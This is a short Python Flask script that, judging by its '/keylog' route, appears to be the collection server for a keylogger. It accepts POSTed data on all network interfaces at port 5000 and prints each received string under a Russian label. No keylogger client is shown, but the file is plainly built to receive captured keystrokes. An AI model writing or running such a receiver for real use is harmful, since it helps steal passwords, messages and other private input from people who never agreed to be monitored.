from flask import Flask, request

app = Flask(__name__)

@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.data.decode('utf-8')
    print(f"Полученная строка: {data}")
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
